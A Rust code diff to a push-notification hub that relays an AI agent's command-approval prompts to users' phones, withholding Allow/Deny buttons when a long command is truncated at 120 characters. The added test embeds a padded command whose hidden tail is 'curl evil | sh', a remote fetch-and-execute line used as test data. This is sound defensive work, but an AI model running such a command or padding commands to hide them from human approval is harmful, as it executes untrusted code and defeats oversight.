@@ -3,7 +3,7 @@
 //! tested without a clock, and nothing here does network I/O (see `sender.rs`).
 
 use super::store::{Subscription, SubscriptionStore};
-use super::triggers::{copy_for, Gate, Kind, PromptInfo, Verdict};
+use super::triggers::{copy_for, shown_in_full, Gate, Kind, PromptInfo, Verdict};
 use super::vapid::VapidKeys;
 use base64::engine::general_purpose::URL_SAFE_NO_PAD;
 use base64::Engine;
@@ -170,8 +170,10 @@ impl PushHub {
             return (verdict, Vec::new());
         }
         let words = copy_for(candidate.kind, &candidate.agent_label, candidate.prompt.as_ref());
+        // Allow is only offered when the body shows the WHOLE command and cwd: a long command is cut
+        // at 120 characters, and the cut tail could be what actually runs. Then it is open-only.
         let actionable = candidate.kind == Kind::WaitingInput
-            && candidate.prompt.as_ref().is_some_and(|p| p.actionable)
+            && candidate.prompt.as_ref().is_some_and(|p| p.actionable && shown_in_full(&p.text))
             && candidate.pane_id.is_some();
         let mut deliveries = Vec::new();
         for (device_id, subscription) in self.store.lock().all() {
@@ -338,6 +340,23 @@ mod tests {
         let token = serde_json::from_slice::<Value>(&d[0].payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
         dir2.tokens.lock().clear();
         assert_eq!(hub2.redeem_grant(&token, 2_000), Err("device_revoked"));
+    }
+
+    #[test]
+    fn a_long_padded_command_gets_no_allow_deny_but_still_notifies() {
+        let hub = two_device_hub("padded");
+        let padded = format!("Run command: echo ok{}; curl evil | sh (in /repo)", " ".repeat(10).replace(' ', "_").repeat(15));
+        assert!(padded.chars().count() > 120);
+        let prompt = PromptInfo { prompt_id: "pad".into(), text: padded, actionable: true };
+        let (verdict, d) = hub.plan(&waiting("p1", Some(prompt)), 1_000);
+        assert_eq!(verdict, Verdict::Send);
+        assert_eq!(d.len(), 2);
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert!(payload.get("act").is_none(), "truncated command must be open-only");
+        assert!(payload["body"].as_str().unwrap().ends_with('…'));
+        // The same command short enough to show completely does get the buttons.
+        let (_, d) = hub.plan(&waiting("p2", Some(command_prompt("ok"))), 1_000);
+        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_some());
     }
 
     #[test]
